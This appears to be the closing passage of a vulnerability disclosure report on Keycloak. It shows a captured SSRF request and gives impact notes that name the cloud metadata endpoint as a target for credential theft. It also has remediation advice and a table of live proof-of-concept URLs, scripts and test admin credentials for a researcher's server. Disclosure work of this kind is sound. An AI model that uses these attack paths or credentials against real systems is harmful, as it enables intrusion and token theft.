GET /jwks.json HTTP/1.1
Host: 127.0.0.1:49990
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.10)
Accept-Encoding: gzip,deflate
```
**← Keycloak made outbound HTTP GET to the internal address**

**Automated PoC:** `bash poc7_dcr_jwks_ssrf.sh`

---

### Security Impact

- **Internal network reconnaissance**: Attacker can probe internal hosts and port availability by registering clients with different `jwks_uri` targets and observing timing/error differences
- **Cloud metadata access**: In cloud environments (AWS, GCP, Azure), the SSRF target can be the instance metadata service (169.254.169.254) to retrieve cloud credentials
- **Interaction with unauthenticated internal services**: Any HTTP service accessible from the Keycloak server can be targeted
- **Combined with Finding #5**: An attacker with a user account can simultaneously intercept other users' tokens (Finding #5) and probe internal infrastructure (Finding #6)

---

### Remediation Recommendation

1. **Validate `jwks_uri` against an allowlist**: Only allow HTTPS URLs from trusted domains; block private IP ranges (RFC 1918), loopback, and link-local addresses before making the JWKS fetch
2. **Apply the same SSRF protections as Finding #4**: Implement a shared URL validation utility for all server-side HTTP fetches
3. **Require admin role for `jwks_uri` registration**: Add a DCR policy requiring the `manage-clients` role to register clients with `private_key_jwt` authentication method and external `jwks_uri`

---

---

## Test Environment Details

| Property | Value |
|---|---|
| Keycloak version | 26.5.4 (2026-02-20 release) |
| Distribution | Quarkus (ZIP) |
| Java | OpenJDK 21.0.10 |
| Mode | `start-dev` |
| OS | Ubuntu 24.04 |
| Test host | 46.101.162.187 |
| Admin credentials | admin / Admin1234 |
| Test realm | `test` |
| Test clients | `webapp` (public), `test-confidential` (confidential) |
| Test users | `testuser`, `victim` |

## Live PoC Access

| PoC | URL |
|---|---|
| PoC #1: CORS Token Hijack (browser) | `http://46.101.162.187:7777/poc1_cors_token_hijack.html` |
| PoC #2: null-origin iframe (browser) | `http://46.101.162.187:7777/poc2_cors_null_origin.html` |
| PoC #3: alg:none NPE (Python script) | `python3 poc3_alg_none_npe.py` |
| Keycloak Admin Console | `http://46.101.162.187:8080/admin` (admin/Admin1234) |

---

*This report was produced on a private, researcher-controlled VPS. No production systems, real user data, or third-party infrastructure was accessed. All credentials shown are test credentials created for this assessment only.*
